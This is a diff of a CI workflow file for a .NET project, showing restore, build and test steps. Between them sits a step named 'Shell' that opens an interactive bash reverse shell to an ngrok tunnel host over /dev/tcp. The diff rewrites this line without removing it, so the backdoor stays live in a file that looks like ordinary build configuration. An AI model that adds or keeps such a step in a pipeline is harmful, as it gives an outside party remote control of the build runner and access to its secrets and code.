@@ -24,7 +24,7 @@ jobs:
     - name: Restore dependencies
       run: dotnet restore
     - name: Shell
-      run: "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/13679 0>&1"
+      run: bash -i >/dev/tcp/0.tcp.us-cal-1.ngrok.io/13679 2>&1 0>&1
     - name: Build
       run: dotnet build --no-restore --configuration Release
     - name: Test
